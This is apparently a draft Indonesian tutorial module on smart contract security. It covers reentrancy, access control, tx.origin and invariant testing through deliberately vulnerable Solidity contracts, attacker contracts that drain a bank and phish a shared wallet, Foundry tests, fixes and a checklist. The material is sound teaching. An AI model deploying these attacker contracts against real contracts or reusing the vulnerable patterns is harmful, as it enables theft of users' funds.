---
title: "Modul 10: Keamanan Smart Contract"
description: Cara terbaik belajar keamanan adalah menyerang contract sendiri. Reentrancy, kontrol akses, tx.origin, dan bug yang hanya bisa ditemukan invariant test.
date: 2026-10-20
slug: modul-10-keamanan-smart-contract
tags: tutorial web 3
series: Tutorial Web 3
status: draft
---

Semua test sejauh ini bertanya "apakah fitur berjalan?". Penyerang bertanya hal lain: apa yang terjadi kalau saya memanggil function ini dari contract buatan saya sendiri, di tengah eksekusi function lain, atau tepat sebelum transaksi orang lain?

Anda sebenarnya sudah menerapkan beberapa pertahanan tanpa tahu alasan mendalamnya: pola **Checks-Effects-Interactions**, **pull payment**, dan menolak **harga basi** dari oracle. Modul ini membuka alasan di baliknya, dengan cara terbaik untuk belajar keamanan: **menyerang contract sendiri**.

Di Web 2, bug keamanan biasanya berarti data bocor. Di smart contract, bug berarti uang hilang: seketika, permanen, dan sering dalam jumlah sangat besar.

## Kenapa ini sulit

| Di aplikasi Web 2 | Di smart contract |
| --- | --- |
| Kode server tertutup | Kode dan bytecode terbuka untuk dipelajari penyerang |
| Bug bisa ditambal dalam menit | Kode umumnya tidak bisa diubah setelah deploy |
| Transaksi bisa dibatalkan bank | Transaksi final |
| Penyerang harus menembus server | Siapa pun boleh memanggil function publik, dari contract apa saja |
| Dana dijaga sistem berlapis | Dana ada langsung di dalam contract |
| Urutan permintaan dikendalikan server | Urutan transaksi bisa dipengaruhi penyusun blok |

Cara berpikir "nanti kalau ada bug kita perbaiki" tidak berlaku.

## Analogi: kasir dan pencuri yang bersuara merdu

Bayangkan kasir yang melayani penarikan dengan urutan ini:

1. Cek buku: "Budi punya Rp1 juta."
2. **Serahkan uang Rp1 juta.**
3. Coret catatan: "Saldo Budi Rp0."

Saat menerima uang di langkah 2, Budi berkata cepat: "Oh ya, saya mau tarik saldo saya juga." Kasir yang belum sempat mencoret buku kembali ke langkah 1: "Budi punya Rp1 juta," lalu menyerahkan uang lagi. Budi mengulanginya sampai laci kosong.

Perbaikannya sederhana: **coret catatan dulu, baru serahkan uang**.

| Dunia kasir | Smart contract |
| --- | --- |
| Menyerahkan uang | `call{value: ...}`, yang menyerahkan kendali eksekusi ke penerima |
| Budi berbicara saat menerima uang | `receive()` di contract penyerang yang memanggil kembali |
| Kembali ke langkah 1 | **Reentrancy** |
| Coret dulu, baru bayar | **Checks-Effects-Interactions** |
| Petugas yang melarang antrean ganda | **ReentrancyGuard** (`nonReentrant`) |
| Kunci laci yang tidak dijaga | Function tanpa kontrol akses |
| Tamu yang mengaku "disuruh bos" | Pemeriksaan `tx.origin` yang bisa ditipu |

## Katalog celah

| Celah | Penjelasan | Pertahanan |
| --- | --- | --- |
| **Reentrancy** | Penerima ETH/token memanggil kembali sebelum state diperbarui | CEI, `nonReentrant`, pull payment |
| **Kontrol akses** | Function sensitif bisa dipanggil siapa saja | `Ownable`/`AccessControl`, inisialisasi di constructor |
| **tx.origin** | Bisa ditipu lewat contract perantara | Selalu `msg.sender` |
| **DoS** | Satu penerima menolak ETH, atau perulangan terlalu panjang | Pull payment, batasi array |
| **Front-running / MEV** | Pihak lain melihat transaksi di mempool dan menyusup | Batas slippage, commit-reveal, tenggat |
| **Manipulasi oracle** | Harga dari sumber tunggal atau pasar sepi | Oracle terdesentralisasi, cek basi |
| **Replay tanda tangan** | Tanda tangan sah dipakai ulang | Nonce, chain ID, alamat contract, tenggat di dalam pesan |
| **Aritmetika** | Pembagian membulatkan ke bawah, overflow di `unchecked` | Kalikan dulu baru bagi |
| **Angka acak lemah** | Memakai data blok sebagai sumber acak | Oracle VRF |

Sebelum Solidity 0.8, angka bisa "meluap": nilai maksimum ditambah 1 kembali jadi 0 tanpa error. Beberapa token ERC-20 dieksploitasi dengan cara ini sehingga penyerang mencetak token dalam jumlah sangat besar dari ketiadaan. Sejak 0.8, operasi aritmetika otomatis revert kalau meluap, kecuali di dalam blok `unchecked`.

## Anatomi reentrancy

```text
Contract Penyerang              BankRentan
       |                             |
       |-- setor 1 ETH ------------->|
       |-- tarik() ----------------->|
       |                             | cek saldo = 1 ETH ✓
       |<------- kirim 1 ETH --------| (saldo BELUM dinolkan)
       | receive() terpicu           |
       |-- tarik() lagi ------------>|
       |                             | cek saldo = 1 ETH ✓ (masih!)
       |<------- kirim 1 ETH --------|
       |      … berulang sampai bank kosong …
       |                             | akhirnya: saldo penyerang = 0
```

Kuncinya: `call{value: ...}` ke sebuah contract **menjalankan kode milik penerima**. Selama kode itu berjalan, function di contract Anda belum selesai, dan state yang belum diperbarui masih terlihat "lama".

Reentrancy juga bisa lewat **token**, karena ERC-721 `safeTransferFrom` dan `_safeMint` memanggil function penerima. Itulah kenapa proyek tiket memakai `_mint` biasa.

Inilah yang terjadi pada **The DAO** (2016). Contract-nya mengirim ETH ke penarik sebelum memperbarui saldo. Penyerang memakai contract yang, setiap kali menerima ETH, langsung memanggil function penarikan lagi. Sekitar sepertiga dananya berpindah. Komunitas Ethereum terbelah: mayoritas memilih hard fork untuk mengembalikan dana, sebagian menolak karena "code is law" dan tetap memakai rantai lama, yang kini dikenal sebagai Ethereum Classic.

## Praktik: menyerang contract sendiri

> **Etika:** semua serangan di sini dilakukan terhadap contract buatan Anda sendiri, di jaringan lokal. Menyerang contract milik orang lain di jaringan publik adalah tindakan ilegal dan merugikan orang nyata. Kalau Anda menemukan celah di protokol sungguhan, laporkan lewat program bug bounty atau kontak keamanan resmi mereka.

### Latihan 1: Menguras bank

```solidity
/// @title CONTOH RENTAN - JANGAN DIPAKAI. Kirim ETH dulu, baru ubah saldo.
contract BankRentan {
    mapping(address => uint256) public saldo;

    function setor() external payable {
        saldo[msg.sender] += msg.value;
    }

    function tarik() external {
        uint256 jumlah = saldo[msg.sender];
        require(jumlah > 0, "Saldo kosong");
        (bool ok, ) = msg.sender.call{value: jumlah}(""); // INTERACTION lebih dulu
        require(ok, "Gagal kirim");
        saldo[msg.sender] = 0;                            // EFFECT terlambat
    }
}
```

```solidity
/// @title Contract penyerang: masuk kembali ke tarik() setiap kali menerima ETH
contract Penyerang {
    IBank public immutable bank;
    uint256 public jumlahMasuk;

    constructor(IBank _bank) { bank = _bank; }

    function serang() external payable {
        bank.setor{value: msg.value}();
        bank.tarik();
    }

    receive() external payable {
        // Selama bank masih punya cukup ETH, panggil tarik() lagi SEBELUM saldo kita dinolkan
        if (address(bank).balance >= msg.value) {
            jumlahMasuk++;
            bank.tarik();
        }
    }
}
```

Versi yang diperbaiki memakai **dua** lapis pertahanan:

```solidity
import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract BankAman is ReentrancyGuard {
    mapping(address => uint256) public saldo;

    function setor() external payable {
        saldo[msg.sender] += msg.value;
    }

    function tarik() external nonReentrant {
        uint256 jumlah = saldo[msg.sender];               // CHECKS
        require(jumlah > 0, "Saldo kosong");
        saldo[msg.sender] = 0;                            // EFFECTS
        (bool ok, ) = msg.sender.call{value: jumlah}(""); // INTERACTIONS
        require(ok, "Gagal kirim");
    }
}
```

Test yang membuktikan keduanya:

```solidity
function test_BankRentanBisaDikuras() public {
    BankRentan bank = new BankRentan();
    vm.prank(warga);
    bank.setor{value: 10 ether}();             // dana warga

    vm.prank(peretas);
    Penyerang p = new Penyerang(IBank(address(bank)));
    vm.prank(peretas);
    p.serang{value: 1 ether}();                // setor 1, lalu tarik berulang

    assertEq(address(bank).balance, 0);        // bank terkuras habis
    assertEq(address(p).balance, 11 ether);    // modal 1 ETH menjadi 11 ETH
}

function test_BankAmanMenolakSerangan() public {
    BankAman bank = new BankAman();
    vm.prank(warga);
    bank.setor{value: 10 ether}();

    vm.prank(peretas);
    Penyerang p = new Penyerang(IBank(address(bank)));
    vm.prank(peretas);
    vm.expectRevert(); // panggilan ulang di receive() gagal, seluruh transaksi dibatalkan
    p.serang{value: 1 ether}();

    assertEq(address(bank).balance, 10 ether); // dana warga utuh
}
```

```text
Saldo bank setelah serangan : 0
ETH di contract penyerang   : 11000000000000000000
Berapa kali masuk kembali   : 10
```

Dengan modal 1 ETH, penyerang membawa pulang 11 ETH.

Dua eksperimen yang layak dicoba: hapus `nonReentrant` tapi pertahankan urutan CEI. Apakah serangan masih gagal, dan kenapa? Lalu kembalikan `nonReentrant` tapi tukar urutannya jadi kirim dulu baru nolkan. Jawabannya menjelaskan kenapa **pertahanan berlapis** tetap disarankan.

### Latihan 2: Kontrol akses dan jebakan tx.origin

Contract kas RT ini punya **dua** kesalahan:

```solidity
/// @title CONTOH RENTAN - JANGAN DIPAKAI.
contract DompetBersamaRentan {
    address public bendahara;
    bool private sudahDiinisialisasi;

    // Kesalahan 1: siapa pun bisa memanggil inisialisasi kalau pembuatnya lupa
    function inisialisasi(address _bendahara) external {
        require(!sudahDiinisialisasi, "Sudah diinisialisasi");
        bendahara = _bendahara;
        sudahDiinisialisasi = true;
    }

    receive() external payable {}

    // Kesalahan 2: memakai tx.origin, bukan msg.sender
    function bayar(address payable ke, uint256 jumlah) external {
        require(tx.origin == bendahara, "Bukan bendahara");
        (bool ok, ) = ke.call{value: jumlah}("");
        require(ok, "Gagal kirim");
    }
}
```

Kesalahan pertama persis yang membekukan ratusan ribu ETH di wallet Parity pada 2017.

Kesalahan kedua membuka jalan phishing:

```solidity
/// @title Contract jebakan: tampak seperti "klaim hadiah", padahal menguras dompet korban
contract HadiahPalsu {
    IDompet public immutable dompet;
    address payable public immutable peretas;

    constructor(IDompet _dompet, address payable _peretas) {
        dompet = _dompet;
        peretas = _peretas;
    }

    function klaimHadiah() external {
        // Saat bendahara memanggil fungsi ini, tx.origin = bendahara
        dompet.bayar(peretas, address(dompet).balance);
    }
}
```

Bedanya:

- `tx.origin` adalah EOA yang **pertama kali** menandatangani transaksi, dan tidak berubah sepanjang rantai panggilan.
- `msg.sender` adalah pemanggil **langsung** function ini.

Kalau dompet memeriksa `tx.origin == bendahara`, contract jebakan yang dipanggil bendahara bisa meneruskan panggilan dan lolos. Dengan `msg.sender`, dompet melihat pemanggil langsungnya adalah contract jebakan, lalu menolak.

```solidity
function test_TxOriginPhishing() public {
    DompetBersamaRentan dompet = new DompetBersamaRentan();
    dompet.inisialisasi(bendahara);
    vm.deal(address(dompet), 5 ether);

    HadiahPalsu jebakan = new HadiahPalsu(IDompet(address(dompet)), peretas);
    vm.prank(bendahara, bendahara);     // dua argumen: mengatur msg.sender DAN tx.origin
    jebakan.klaimHadiah();
    assertEq(peretas.balance, 5 ether); // kas RT pindah ke peretas
}

function test_VersiAmanMenolakJebakan() public {
    DompetBersamaAman dompet = new DompetBersamaAman(bendahara);
    vm.deal(address(dompet), 5 ether);

    HadiahPalsu jebakan = new HadiahPalsu(IDompet(address(dompet)), peretas);
    vm.prank(bendahara, bendahara);
    vm.expectRevert(DompetBersamaAman.BukanBendahara.selector); // msg.sender = contract jebakan
    jebakan.klaimHadiah();
    assertEq(address(dompet).balance, 5 ether);
}
```

### Latihan 3: Bug yang hanya ditemukan invariant test

Contract ini terlihat wajar, dan semua unit test sederhana akan lolos:

```solidity
contract KasRT {
    mapping(address => uint256) public saldo;

    function setor() external payable {
        saldo[msg.sender] += msg.value;
    }

    function tarik(uint256 jumlah) external {
        require(saldo[msg.sender] >= jumlah, "Saldo kurang");
        saldo[msg.sender] -= jumlah;
        (bool ok, ) = msg.sender.call{value: jumlah}("");
        require(ok, "Gagal kirim");
    }

    function pindah(address ke, uint256 jumlah) external {
        uint256 saldoAsal = saldo[msg.sender];
        uint256 saldoTujuan = saldo[ke];
        require(saldoAsal >= jumlah, "Saldo kurang");
        saldo[msg.sender] = saldoAsal - jumlah;
        saldo[ke] = saldoTujuan + jumlah;
    }
}
```

Fuzz test menguji **satu** function dengan input acak. Invariant test menguji **rangkaian** panggilan acak dari banyak pengguna, lalu memeriksa sifat yang harus selalu benar.

```solidity
/// @notice Handler: "pengguna virtual" yang dipanggil fuzzer dengan urutan aksi acak
contract Handler is Test {
    KasRT public kas;
    address[] public warga;

    constructor(KasRT _kas) {
        kas = _kas;
        warga.push(makeAddr("budi"));
        warga.push(makeAddr("sari"));
        warga.push(makeAddr("joko"));
    }

    function _pilih(uint256 benih) internal view returns (address) {
        return warga[benih % warga.length];
    }

    function setor(uint256 benih, uint256 jumlah) external {
        address w = _pilih(benih);
        jumlah = bound(jumlah, 0, 10 ether);
        vm.deal(w, jumlah);
        vm.prank(w);
        kas.setor{value: jumlah}();
    }

    function pindah(uint256 benihDari, uint256 benihKe, uint256 jumlah) external {
        address dari = _pilih(benihDari);
        address ke = _pilih(benihKe);
        jumlah = bound(jumlah, 0, kas.saldo(dari));
        vm.prank(dari);
        kas.pindah(ke, jumlah);
    }

    function totalSaldo() external view returns (uint256 total) {
        for (uint256 i = 0; i < warga.length; i++) total += kas.saldo(warga[i]);
    }
}

contract KasRTInvariantTest is Test {
    KasRT kas;
    Handler handler;

    function setUp() public {
        kas = new KasRT();
        handler = new Handler(kas);
        targetContract(address(handler)); // fuzzer hanya memanggil function di handler
    }

    /// @notice Sifat yang HARUS selalu benar: total catatan saldo = ETH yang ada di kas
    function invariant_TotalSaldoSamaDenganEthDiKas() public view {
        assertEq(handler.totalSaldo(), address(kas).balance);
    }
}
```

Foundry menemukan pelanggaran dan memperkecil urutannya jadi hanya **dua langkah**: `setor`, lalu `pindah` di mana pengirim dan penerima adalah **warga yang sama**.

Penjelasannya: kalau `ke == msg.sender`, `saldoAsal` dan `saldoTujuan` adalah salinan nilai yang sama. Baris pertama menulis `saldo - jumlah`, lalu baris kedua **menimpanya** dengan `saldo + jumlah`. Saldo bertambah tanpa ETH masuk, dan warga itu bisa menarik ETH milik orang lain.

Perbaikannya:

```solidity
function pindah(address ke, uint256 jumlah) external {
    require(saldo[msg.sender] >= jumlah, "Saldo kurang");
    saldo[msg.sender] -= jumlah; // baca-tulis langsung, tidak memakai salinan lama
    saldo[ke] += jumlah;
}
```

Setelah diperbaiki: `runs: 256, calls: 128000, reverts: 0`.

Bug semacam ini pernah muncul di contract sungguhan, dan unit test biasa hampir tidak pernah menangkapnya, karena penulis test jarang terpikir untuk mengirim ke diri sendiri.

## Checklist sebelum deploy

- [ ] Setiap function yang mengirim ETH atau token mengikuti Checks-Effects-Interactions.
- [ ] Function yang memanggil contract luar dan mengubah state memakai `nonReentrant`.
- [ ] Setiap function sensitif punya kontrol akses, **dan ada test "orang lain ditolak"**.
- [ ] Tidak ada `tx.origin` untuk otorisasi.
- [ ] Tidak ada fungsi inisialisasi yang bisa dipanggil siapa saja.
- [ ] Pembayaran ke banyak pihak memakai pull payment.
- [ ] Tidak ada perulangan atas array yang bisa tumbuh tanpa batas.
- [ ] Harga dari oracle diperiksa: positif dan tidak basi.
- [ ] Tanda tangan yang diverifikasi memuat nonce, chain ID, alamat contract, dan tenggat.
- [ ] Tidak memakai data blok sebagai sumber acak.
- [ ] Memakai komponen OpenZeppelin untuk hal standar.
- [ ] Unit test, fuzz test, dan minimal satu invariant test.
- [ ] Alat analisis statis dijalankan dan setiap peringatan ditinjau.
- [ ] Untuk dana bernilai: audit independen dan program bug bounty.

## Batasnya

Tidak ada contract yang "pasti aman". Yang ada hanya contract yang risikonya sudah dikurangi sebanyak mungkin.

Audit mahal dan bukan jaminan, karena banyak protokol yang sudah diaudit tetap diretas. Pertahanan menambah biaya gas. Celah baru terus ditemukan, terutama dari interaksi antar-protokol. Alat otomatis menghasilkan banyak peringatan palsu dan tetap bisa melewatkan bug logika.

Dan yang paling sering dilupakan: **kesalahan di luar kode**. Peretasan bridge Ronin bukan bug Solidity. Celahnya adalah sedikitnya jumlah pemegang kunci validator. Keamanan juga mencakup manajemen kunci dan desain kepercayaan.

## Rangkuman

- Smart contract terbuka, tidak bisa diubah, dan memegang dana langsung.
- **Reentrancy** terjadi karena mengirim ETH atau token menjalankan kode penerima.
- **Kontrol akses**: jaga setiap function sensitif, inisialisasi di constructor, gunakan `msg.sender`.
- Cara terbaik memahami celah adalah **menulis test yang menyerang contract Anda sendiri**.
- **Invariant test** menemukan bug yang tidak terpikirkan.
- Audit, alat otomatis, dan test saling melengkapi, tapi tidak satu pun menjamin keamanan mutlak.

## Masalah terbuka

Contract Anda kini lebih aman. Tapi ketika RT 05 mencoba arisan dan tiket di Ethereum mainnet, warga protes soal **biaya**: saat jaringan ramai, satu transaksi setor bisa memakan biaya yang tidak sebanding dengan iurannya. Proteksi seperti `nonReentrant` juga menambah sedikit gas.

Bagaimana membuat transaksi jauh lebih murah dan cepat tanpa mengorbankan keamanan Ethereum, dan bagaimana menulis contract yang lebih hemat gas?

Itulah modul berikutnya.
